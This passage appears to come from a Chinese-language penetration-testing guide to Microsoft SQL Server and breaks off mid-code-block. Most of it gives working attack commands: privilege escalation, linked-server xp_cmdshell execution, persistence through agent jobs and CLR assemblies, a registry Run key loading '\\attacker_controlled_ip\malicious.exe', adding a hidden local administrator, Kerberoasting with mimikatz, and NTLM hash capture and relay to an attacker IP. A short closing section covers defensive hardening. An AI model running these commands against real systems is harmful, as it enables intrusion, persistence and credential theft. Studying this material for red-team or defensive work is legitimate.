class="code"><pre><span class="line">CREATE LOGIN somebody WITH PASSWORD &#x3D; &#39;Password123&#39;; &#x2F;&#x2F;为WebApp创建SQL登录名。 USE test</span><br><span class="line">ALTER LOGIN [somebody] with default database &#x3D; [test];</span><br><span class="line">CREATE USER somebody FROM LOGIN [somebody];</span><br><span class="line">EXEC sp_addrolemember [db_owner], [somebody]; &#x2F;&#x2F;为此SQL登录名分配db_owner角色。 Webapp可以从数据库访问所需的任何内容。</span><br><span class="line">ALTER DATABASE CurrentDB SET TRUSTWORTHY ON &#x2F;&#x2F;将数据库设置为可信任的访问外部资源。</span><br></pre></td></tr></table></figure><p>可以在查询中识别此类数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUSER_NAME(owner_id) as DBOWNER, d.name as DATABASENAME FROM</span><br><span class="line">sys.server_principals r INNER JOIN sys.server_role_members m on r.principal_id &#x3D;</span><br><span class="line">m.role_principal_id INNER JOIN sys.server_principals p ON p.principal_id &#x3D;</span><br><span class="line">m.member_principal_id inner join sys.databases d on suser_sname(d.owner_sid) &#x3D;</span><br><span class="line">p.name WHERE is_trustworthy_on &#x3D; 1 AND d.name NOT IN (&#39;MSDB&#39;) and r.type &#x3D; &#39;R&#39;</span><br><span class="line">and r.name &#x3D; N&#39;sysadmin&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image85.png"></p><p>可以使用以下metasploit模块自动进行探测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;admin&#x2F;mssql&#x2F;mssql_escalate_dbowner</span><br><span class="line">auxiliary&#x2F;admin&#x2F;mssql&#x2F;mssql_escalate_dbowner_sqi</span><br></pre></td></tr></table></figure><p><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/">更多方法可参考NetSpi博客</a></p><h4 id="服务帐户"><a href="#服务帐户" class="headerlink" title="服务帐户"></a>服务帐户</h4><p>SQL Server所有版本都为服务帐户提供sysadmin特权。<br>列出常见的一些服务帐户类型:</p><ul><li>域用户</li><li>本地用户</li><li>本地系统</li><li>网络服务</li><li>本地托管服务帐户</li><li>域托管服务帐户</li></ul><p>PowerUpSQL的Invoke-SQLOSCMD可用于基本命令执行。<br>对于单个主机实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SQLOSCMD –Verbose –Instance &quot;server1\instance1&quot; –Command &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p>对于域内实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceDomain | InvokeSQLOSCMD –Verbose –Command &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p>如果我们攻击了一个SQL Server，那么我们也将使用该共享帐户来攻击所有SQL Server。</p><h4 id="爬数据库链接"><a href="#爬数据库链接" class="headerlink" title="爬数据库链接"></a>爬数据库链接</h4><p>数据库链接(Database Link)本质上是两个服务器之间的持久连接。数据库链接(Database Link)的 作用是，允许一个数据库服务器去对其他的数据库服务器进行查询。数据链接可以用不同的方式进行配置，但是更多时候我们看到它们使用硬编码的凭据。<br>Public角色使用openquery()函数，对被链接的数据库服务器进行查询;也可以执行xp_cmdshell，对远 程访问也无凭证要求。通常配置此功能会使数据库服务器，拥有过多的特权。因此允许在远程服务器上的模拟登录，切换到高权限账号的上下文中。<br>下图简单说明当数据库对链接查询功能配置过高特权时，注入的payload是如何被传递:</p><p><img src="/images/image86.jpeg"></p><p>列出所有链接的服务器名，通常有两个选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_linkedservers</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT srvname FROM master..syservers</span><br></pre></td></tr></table></figure><p><img src="/images/image87.png"></p><p>查询一个服务器的所有链接的服务器名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT srvnaem From openquery(DB1, &#39;select srvname FROM master..sysservers&#39;)</span><br></pre></td></tr></table></figure><p>查询一个服务器的某个链接的服务器所链接的服务器名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT srvnaem From openquery(DB1, &#39;select srvname FROM openquery(HVA, &quot;SELECT</span><br><span class="line">srvname FROM master..syservers&quot;)&#39;)</span><br></pre></td></tr></table></figure><p>查询可以一直嵌套执行，直到穷尽所有数据库服务器。在链接的服务器上执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM openquery(DB1, &#39;SELECT * FROM openquery(HVA, &quot;SELECT 1; exec</span><br><span class="line">xp_cmdshell&#39;&quot;&#39;ping 192.168.1.1&quot;&quot; &#39;&#39;)&#39;)</span><br></pre></td></tr></table></figure><p>SQL Server 2005存在链接爬网命令执行漏洞，使用msf的mssql_linkcrawler模块可获得反弹shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_linkcrawler</span><br></pre></td></tr></table></figure><p><img src="/images/image88.jpeg"><br><img src="/images/image89.jpeg"></p><p>自动化爬网的工具：</p><ul><li><a href="https://www.rapid7.com/db/modules/exploit/windows/mssql/mssql_linkcrawler">mssql_linkcrawler</a></li><li><a href="https://blog.netspi.com/sql-server-link-crawling-powerupsql/">PowerUpSQL</a></li><li>……</li></ul><h3 id="从系统管理员到Sysadmin"><a href="#从系统管理员到Sysadmin" class="headerlink" title="从系统管理员到Sysadmin"></a>从系统管理员到Sysadmin</h3><p>首先先了解三个点：</p><ul><li>SQL Server较旧的版本为本地管理员提供sysadmin特权</li><li>SQL Server较旧的版本为本地系统提供sysadmin特权</li><li>SQL Server所有版本都为SQL Server服务帐户提供sysadmin特权</li></ul><p>以下是利用点和常用工具列表：</p><table><thead><tr><th>利用点</th><th>SQL Server 2000</th><th>SQL Server 2005</th><th>SQL Server 2008</th><th>SQL Server 2012</th><th>SQL Server 2014</th><th>SQL Server 2016</th></tr></thead><tbody><tr><td>服务凭证</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>本地管理员</td><td>√</td><td>√</td><td>×</td><td>×</td><td>×</td><td>×</td></tr><tr><td>本地系统</td><td>√</td><td>√</td><td>√</td><td>×</td><td>×</td><td>×</td></tr><tr><td>SQL Server进程 注入</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>?</td></tr><tr><td>令牌窃取</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>?</td></tr><tr><td>单用户模式</td><td>?</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><p>附PowerUpSQL一些执行命令：</p><table><thead><tr><th>描述</th><th>命令</th></tr></thead><tbody><tr><td>SQL Server帐户的域用户。 以域用户身份运行时，此功能将自动执行4 件事。1.通过LDAP查询到DC的SPN来识别域上的SQL Server。2.尝试登 录每个。3.使用多种方法 执行UNC路径注入。4.尝 试捕获关联的SQL Server 服务帐户的密码哈希。</td><td>Invoke-SQLUncPathInjection -Verbose -CaptureIp 10.1.1.12</td></tr><tr><td>通过服务帐户模拟将OS管理员转换为sysadmin，然后所有PowerUpSQL命令都可以以sysadmin身份运行。</td><td>Invoke-SQLImpersonateService -Verbose -Instance MSSQLSRV04\BOSCHSQL</td></tr><tr><td>审核问题</td><td>Invoke-SQLAudit -Verbose -Instance SQLServer1</td></tr><tr><td>升级到sysadmin</td><td>Invoke-SQLEscalatePriv -Verbose -Instance SQLServer1</td></tr><tr><td>执行OS命令: xp_cmdshell</td><td>$Targets | Invoke-SQLOSCmd -Verbose -Command “Whoami” - Threads 10</td></tr><tr><td>执行OS命令:自定义扩 展存储过程</td><td>Create-SQLFileXpDll -OutFile c:    emp\test.dll -Command “echo test &gt; c:\temp\test.txt” -ExportName xp_test -Verbose Get-SQLQuery - Verbose -Query “sp_addextendedproc ‘xp_test’, ‘\yourserver\yourshare\myxp.dll’” xp_test sp_dropextendedproc ‘xp_test’</td></tr><tr><td>执行OS命令:CLR</td><td>$Targets | Invoke-SQLOSCLR -Verbose -Command “Whoami”</td></tr><tr><td>执行OS命令:Ole自动化 过程</td><td>$Targets | Invoke-SQLOSOle -Verbose -Command “Whoami”</td></tr><tr><td>执行OS命令:外部脚本- R</td><td>$Targets | Invoke-SQLOSR -Verbose -Command “Whoami”</td></tr><tr><td>执行OS命令:外部脚本- Python</td><td>$Targets | Invoke-SQLOSPython -Verbose -Command “Whoami”</td></tr><tr><td>执行OS命令:代理作业- CmdExec</td><td>$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command “echo hello &gt; c:\windows    emp\test1.txt”</td></tr><tr><td>执行OS命令:代理作业- PowerShell</td><td>$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command ‘write-output “hello world”</td></tr><tr><td>执行OS命令:代理作业- VBScript</td><td>$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command ‘c:\windows\system32\cmd.exe /c echo hello &gt; c:\windows    emp\test3.txt’</td></tr><tr><td>执行OS命令:代理作业- JScript</td><td>$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command ‘c:\windows\system32\cmd.exe /c echo hello &gt; c:\windows    emp\test3.txt’</td></tr><tr><td>检索数据库链接</td><td>Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\Instance1</td></tr><tr><td>检索数据库链接并执行查 询</td><td>Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\Instance1 -Query “select name from master..sysdatabases”</td></tr><tr><td>抓取数据库链接并执行OS命令</td><td>Get-SQLCrawl -instance “SQLSERVER1\Instance1” -Query “exec master..xp_cmdshell ‘whoami’”</td></tr><tr><td>转储代理任务的内容。通常包含密码。详细输出包括作业摘要数据。</td><td>$Results = Get-SQLAgentJob -Verbose -Instance Server1\Instance1 -Username sa -Password ‘123qweASD’</td></tr><tr><td>枚举所有SQL登录名作为最低特权用户，并测试用户名作为密码。</td><td>针对单个服务器 Invoke-SQLAuditWeakLoginPw -Verbose - Instance SQLServer1\Instance1 运行针对域SQL Server运行 $WeakPasswords = Get-SQLInstanceDomain -Verbose</td></tr></tbody></table><hr><h2 id="SQL-Server权限维持"><a href="#SQL-Server权限维持" class="headerlink" title="SQL Server权限维持"></a>SQL Server权限维持</h2><p>利用SQL Server设置权限维持方法，主要还是靠SQL Server代理作业，定期执行计划任务。为了实现无文件攻击，还利用CLR程序集功能，加载恶意DLL文件。通过这两种内置功能进行持久化，实现了在无文件落地、无其他进程的情况下，实施权限维持。<br>此持久化有几个前提条件:</p><ul><li>启动SQL Server代理服务</li><li>开启CLR功能 </li><li>将存储.Net程序集的数据库配置为可信赖的</li></ul><p>以上均在SQL Server代理执行计划任务和SQL Server CLR相关利用详细介绍。</p><h3 id="高隐蔽性持久化"><a href="#高隐蔽性持久化" class="headerlink" title="高隐蔽性持久化"></a>高隐蔽性持久化</h3><p>连接SQL Server数据库后，创建SQL Server代理作业，定时执行SQL语句调用恶意的用户自定义存储过程或函数利用SQL语句将CLR程序集以十六进制形式加载加载进数据库，实现通过用户自定义函数调用恶意的CLR程序集。已创建的SQL Server代理作业，定期执行计划任务，调用CLR程序集，实现无文件持 久化。<br>首先创建名为CreateWarSQLKit的存储过程(WarSQLKit相关的利用可查看第二章中SQL ServerCLR相关利用的WarSQLKit篇章)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USE msdb;</span><br><span class="line">CREATE procedure CreateWarSQLKit as</span><br><span class="line">    CREATE ASSEMBLY [WarSQLKit]</span><br><span class="line">    AUTHORIZATION [dbo]</span><br><span class="line">    FROM 0x4D5A......</span><br><span class="line">    WITH PERMISSION_SET &#x3D; UNSAFE;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p><img src="/images/image91.png"></p><p>创建SQL Server代理作业，定期执行CreateWarSQLKit，实现WarSQLKit的DLL文件持久化。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">USE msdb;</span><br><span class="line">EXEC dbo.sp_add_job @job_name &#x3D; N&#39;test_CreateWarSQLKit_job1&#39;;</span><br><span class="line">EXEC sp_add_jobstep</span><br><span class="line">    @job_name &#x3D; N&#39;test_CreateWarSQLKit_job1&#39;,</span><br><span class="line">    @step_name &#x3D; N&#39;test_CreateWarSQLKit_name1&#39;,</span><br><span class="line">    @subsystem &#x3D; N&#39;TSQL&#39;,</span><br><span class="line">    @command &#x3D; N&#39;exec CreateWarSQLKit&#39;,</span><br><span class="line">    @retry_attempts &#x3D; 5,</span><br><span class="line">    @retry_interval &#x3D; 5 ;</span><br><span class="line">EXEC dbo.sp_add_jobserver @job_name &#x3D; N&#39;test_CreateWarSQLKit_job1&#39;;</span><br><span class="line">EXEC dbo.sp_start_job N&#39;test_CreateWarSQLKit_job1&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image92.png"></p><h3 id="其他方式实现持久化"><a href="#其他方式实现持久化" class="headerlink" title="其他方式实现持久化"></a>其他方式实现持久化</h3><p>除了正常利用SQL Server可以执行系统命令的存储过程，以下操作都是作为SQL对象存储在数据库中，并且没有任何更改到磁盘，也可以做到无文件持久化。<br>可以为utilman.exe设置调试器，该调试器将在调用cmd.exe时运行。仅sysadmins特权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1</span><br><span class="line">Get-SQLPersistentRegDebugger -Verbose -FileName utilman.exe -Command</span><br><span class="line">&#39;c:\windows\system32\cmd.exe&#39; -Instance SQLServerName\InstanceName&#39;</span><br></pre></td></tr></table></figure><p>可以利用CurrentVersion \run与xp_regwrite建立。仅sysadmins特权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1</span><br><span class="line">Get-SQLPersistentRegRun -Verbose -Name legit -Command</span><br><span class="line">&#39;\\attacker_controlled_ip\malicious.exe&#39; -Instance &#39;SQLServerName\InstanceName&#39;</span><br></pre></td></tr></table></figure><p>可以将所有自定义CLR程序集导出到DLL，最后导入后门CLR。仅sysadmins特权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1</span><br><span class="line">$Results &#x3D; Get-SQLStoredProcedureCLR -Verbose -Instance</span><br><span class="line">&#39;SQLServerName\InstanceName&#39; -UserName sa -Password &#39;password&#39; -ExportFolder</span><br><span class="line">c:\temp</span><br><span class="line">Create-SQLFileCLRDll -Verbose -SourceDllPath c:\temp\evil.exe</span><br></pre></td></tr></table></figure><p>如果遇到SQLServer中的xplog70.dll文件被删除或放到其他地方了， xp_cmdshell就无法执行我们发出 的命令了。可以考虑SQLServer中有一系列与OLE相关的存储过程，这一系列的存储过程同xp_cmdshell 以及读取注册表系列的存储过程一样危险，所以被删除的可能性就小一些。这系列的存储过程有 sp_OACreate，sp_OADestroy，sp_OAGetErrorInfo，sp_OAGetProperty，sp_OAMethod， sp_OASetProperty，sp_OAStop。<br>可以在系统添加一个用户名为test，密码为12345678，并加入管理员组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @shell INT EXEC SP_OACREATE &#39;wscript.shell&#39;,@shell OUTPUT EXEC</span><br><span class="line">SP_OAMETHOD @shell,&#39;run&#39;,null, &#39;c:\windows\system32\cmd.exe &#x2F;c net user test</span><br><span class="line">12345678 &#x2F;add&#39;</span><br><span class="line">DECLARE @shell INT EXEC SP_OACREATE &#39;wscript.shell&#39;,@shell OUTPUT  EXEC</span><br><span class="line">SP_OAMETHOD @shell,&#39;run&#39;,null, &#39;c:\windows\system32\cmd.exe &#x2F;c net  localgroup</span><br><span class="line">administrators test &#x2F;add &#39;</span><br></pre></td></tr></table></figure><p>xp_cmdshell、SP_OACREATE等可执行系统命令的存储过程，以及与它们相对应的动态连接库文件 (DLL)都被删除了，还可以读取和修改注册表的存储过程(xp_regread、xp_regwrite)来克隆对方系 统的管理员用户。<br>PowerUpSQL命令参考:</p><table><thead><tr><th>描述</th><th>命令</th></tr></thead><tbody><tr><td>将所有自定义CLR程序集导 出到DLL。它们可以脱机反 编译，并且通常包含密码。而且，无需过多努力即可将其借壳。</td><td>$Results = Get-SQLStoredProcedureCLR -Verbose - Instance Server1\Instance1 -Username sa -Password ‘P@ssword!’ -ExportFolder c:\temp $Results | Out-GridView</td></tr><tr><td>创建一个可用于导入现有(或后门)CLR程序集的 SQL命令。</td><td>Create-SQLFileCLRDll -Verbose -SourceDllPath c:\temp\evil.dll 博客：<a href="https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/">https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/</a></td></tr><tr><td>创建可用于导入CLR程序集以执行OS命令的DLL和SQL命令。</td><td>Create-SQLFileCLRDll -Verbose -ProcedureName runcmd - OutDir c:\temp -OutFile evil</td></tr><tr><td>获取共享SQL Server服务帐户的列表。</td><td>Get-SQLInstanceDomain -Verbose | Select-Object  DomainAccount, ComputerName -Unique | Group-Object 注意:任 何大于1的计数都表示在多个系统上使用的域帐户可能会被用于 SMB中继攻击。</td></tr></tbody></table><hr><h2 id="SQL-Server横向移动"><a href="#SQL-Server横向移动" class="headerlink" title="SQL Server横向移动"></a>SQL Server横向移动</h2><h3 id="Kerberoast攻击"><a href="#Kerberoast攻击" class="headerlink" title="Kerberoast攻击"></a>Kerberoast攻击</h3><p>利用传统的Kerberoast攻击方式进行横向移动，Kerberoast是一种针对Kerberos协议的攻击方式。根据 Kerberos协议，当向活动目录完成身份验证后，密钥分发中心(KDC)会将服务授权的票据(TGT)发送给用户，作为访问资源时的身份凭证。当需要访问资源，向票据服务器(TGS)发送Kerberos票据 时，首先需要使用具有有效身份用户的票据(TGT)向票据服务器(TGS)请求乡音的服务票据。当该票据(TGT)被验证具有此服务的权限时，会向用户发送一张新的票据。新的票据使用SPN关联的计算机中的服务账号的NTLM Hash。攻击者可以尝试不同的NTLM Hash来开启Kerberos票据。NTLM Hash对应的是服务账号的密码。</p><p>实施此攻击前有几个前提条件：</p><ul><li>域内用户运行的SQL Server已经手动注册过SPN</li><li>Kerberos协议加密方式为RC4_HMAC_MD5</li></ul><p>通过SQL Server能执行PowerShell命令的利用点和导入特定功能的CLR程序集即可完成Kerberoast攻击。</p><p>查看指定域内用户所注册的SPN</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -L SEC\MSSQL2</span><br></pre></td></tr></table></figure><p><img src="/images/image93.png"></p><p>通过上文设置WarSQLKit的DLL存在sp_Mimikatz存储，执行mimikatz。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_cmdExec &#39;sp_Mimikatz&#39;;</span><br><span class="line">select * from WarSQLKitTemp &#x2F;&#x2F;获取Mimikatz日志</span><br></pre></td></tr></table></figure><p><img src="/images/image94.png"></p><p>或者利用任何一种可以执行PowerShell命令的方式，可以请求到SPN的Kerberos票据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -</span><br><span class="line">ArgumentList &quot;MSSQLSvc&#x2F;MSSQL2.sec.com:1433&quot;</span><br><span class="line">exec xp_cmdshell &#39;powershell Add-Type -AssemblyName System.IdentityModel ; New-</span><br><span class="line">Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList</span><br><span class="line">&quot;MSSQLSvc&#x2F;MSSQL2.sec.com:1433&quot;&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image95.png"><br><img src="/images/image96.png"></p><p>之后可以使用PowerShell命令远程下载部署<a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>，或者<a href="https://github.com/nidem/kerberoast">kerberoast</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#mimikatz:kerberos::list &#x2F;export</span><br></pre></td></tr></table></figure><p><img src="/images/image97.png"></p><p>导出的票据会保存到当前目录的kirbi文件。</p><p><img src="/images/image98.png"></p><p>利用<a href="https://github.com/nidem/kerberoast">kerberoast</a>中的tgsrepcrack.py脚本，离线破解NTLM Hash。<br>PowerUpSQL中使用Get-SQLServerPasswordHash，可自动提取SQL登录密码哈希：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1</span><br><span class="line">Get-SQLServerPasswordHash -Verbose -Instance &#39;SQLServerName\InstanceName&#39; -</span><br><span class="line">Migrate</span><br></pre></td></tr></table></figure><h3 id="CLR实现无文件落地横向移动"><a href="#CLR实现无文件落地横向移动" class="headerlink" title="CLR实现无文件落地横向移动"></a>CLR实现无文件落地横向移动</h3><p><a href="https://research.nccgroup.com/author/dcashncc/">David Cash</a>在<a href="https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/">MSSQL Lateral Movement</a>介绍了SQL Server中使用CLR自动执行横向移动而无文件落地和不需要xp_cmdshell，以及如何防止被检测到。</p><p>CLR相关的介绍在上文已经介绍，在此不再赘述。通常为实现命令执行而对MSSQL服务进行后期开发通 常会利用XP_CMDSHELL存储过程在MSSQL进程的上下文中运行操作系统命令。要使用此技术运行自定义代码，通常需要使用LOLBINS，添加新的操作系统用户或通过BCP写入磁盘的二进制文件，这提供了明显的检测机会。</p><p>SQL Server服务进程可以执行提供给它的任何.NET代码，因此利用.NET代码进行横向移动，仅需要构建 适当的DLL。作为概念的证明，为了生成了一个简单的程序集，该程序集对一些shellcode进行XOR并将 其注入到生成的进程中。使用<a href="https://github.com/nccgroup/nccfsas/tree/main/Tools/Squeak">Squeak</a>可以简化CLR代码的创建和调用，下面是Squeak具备的一些功能：</p><ul><li>展示连接数据</li><li>从原始二进制文件和单字节XOR读取shellcode字节</li><li>生成一个MSSQL CLR DLL，该DLL对shellcode进行XOR，生成一个新进程，然后将shellcode注入其中。</li><li>计算DLL的SHA512哈希</li><li>生成带有硬编码参数的单个.NET可执行文件，以通过SQL连接执行DLL,该可执行文件执行以下操作：<ul><li>创建一个SQL连接 </li><li>检查SQL Server版本</li><li>检查DBA权限</li><li>检查并记录现有的安全设置</li><li>修改安全设置</li><li>创建并运行程序集</li><li>恢复安全设置并删除程序集</li></ul></li></ul><p>使用<a href="https://github.com/nccgroup/nccfsas/tree/main/Tools/Squeak">Squeak</a>可以生成带有连接字符串和CLR程序集的独立可执行文件。CLR程序集的代码是从本地目录中的文件中加载，可以直接打开文件，也可以在工具中对其进行编辑。</p><h3 id="UNC路径注入"><a href="#UNC路径注入" class="headerlink" title="UNC路径注入"></a>UNC路径注入</h3><p>UNC用于访问远程文件服务器，格式为\ip\file，如果我们可以执行这个功能，则可以强制SQL Server向<br>我们进行身份验证，并且可以获得SQL Server服务帐号的NTLM密码哈希。</p><h4 id="可以通过以下方式实现自动化："><a href="#可以通过以下方式实现自动化：" class="headerlink" title="可以通过以下方式实现自动化："></a>可以通过以下方式实现自动化：</h4><ul><li>PowerUpSQL的Get-SQLServiceAccountPwHashes脚本</li><li>SQL NTLM Hash：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUpSQL.ps1&#96;</span><br><span class="line">Import-Module C:\PowerUpSQL-master\Scripts\3rdparty\Inveigh.ps1</span><br><span class="line">Import-Module C:\PowerUpSQL-master\Scripts\pending\Get-</span><br><span class="line">SQLServiceAccountPwHashes.ps1</span><br><span class="line">Get-SQLServiceAccountPwHashes -Verbose -TimeOut 20 -CaptureIp</span><br><span class="line">attacker_controlled_ip</span><br></pre></td></tr></table></figure></li><li>使用smbrelayx（impacket）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbrelayx.py -h sqlserverIP -c &#39;powershell empire launcher&#39;</span><br></pre></td></tr></table></figure></li><li>metasploit的SQL NTLM Hash：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary&#x2F;admin&#x2F;mssql&#x2F;mssql_ntlm_stealer</span><br><span class="line">set SMBPROXY attackerIP</span><br><span class="line">set RHOST webappwithsqliIP</span><br><span class="line">set GET_PATH pathtosqli</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="防守方如何应对"><a href="#防守方如何应对" class="headerlink" title="防守方如何应对"></a>防守方如何应对</h1><h2 id="账号管理"><a href="#账号管理" class="headerlink" title="账号管理"></a>账号管理</h2><h4 id="查询目前所有用户列表"><a href="#查询目前所有用户列表" class="headerlink" title="查询目前所有用户列表"></a>查询目前所有用户列表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name,password from syslogins order by name</span><br></pre></td></tr></table></figure><p><img src="/images/image99.png"></p><h4 id="为不同的管理员分配不同的账号"><a href="#为不同的管理员分配不同的账号" class="headerlink" title="为不同的管理员分配不同的账号"></a>为不同的管理员分配不同的账号</h4><p>按照使用目的进行分配账号，避免不同用户间共享账号，提高安全性。或在企业管理器中直接添加远程<br>登陆用户建立角色，并给角色授权，把角色赋给不同的用户或修改用户属性中的角色和权限。<br>添加不同用户，参考配置操作:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sp_addlogin &#39;user1&#39;,&#39;password1&#39;</span><br><span class="line">sp_addlogin &#39;user2&#39;,&#39;password2&#39;</span><br></pre></td></tr></table></figure><h4 id="删除或锁定无效账号"><a href="#删除或锁定无效账号" class="headerlink" title="删除或锁定无效账号"></a>删除或锁定无效账号</h4><p>删除冗余的系统默认账号，减少系统安全隐患，参考配置操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 安全性 -&gt; 登录名 -&gt; 选择要 删除的用户名(右键)</span><br></pre></td></tr></table></figure><p><img src="/images/image100.png"></p><h4 id="限制启动账号权限"><a href="#限制启动账号权限" class="headerlink" title="限制启动账号权限"></a>限制启动账号权限</h4><p>启动mssql的用户权限过高，会导致其子进程具有相同权限，参考配置操作:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt;属性(右键) -&gt; 安全性</span><br></pre></td></tr></table></figure><p>新建SQL server服务账号后，建议将其从User组中删除，且不要把该账号提升为Administrators组的成 员，授予以账户最少启动权限。</p><p><img src="/images/image101.png"></p><hr><h2 id="认证授权"><a href="#认证授权" class="headerlink" title="认证授权"></a>认证授权</h2><h4 id="权限最小化"><a href="#权限最小化" class="headerlink" title="权限最小化"></a>权限最小化</h4><p>在数据库权限配置能力内，根据用户的业务需要，配置其所需的最小权限，参考配置操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 属性(右键) -&gt; 安全性</span><br></pre></td></tr></table></figure><p><img src="/images/image102.png"></p><h4 id="数据库角色"><a href="#数据库角色" class="headerlink" title="数据库角色"></a>数据库角色</h4><p>使用数据库角色（ROLE）来管理对象的权限，参考配置操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 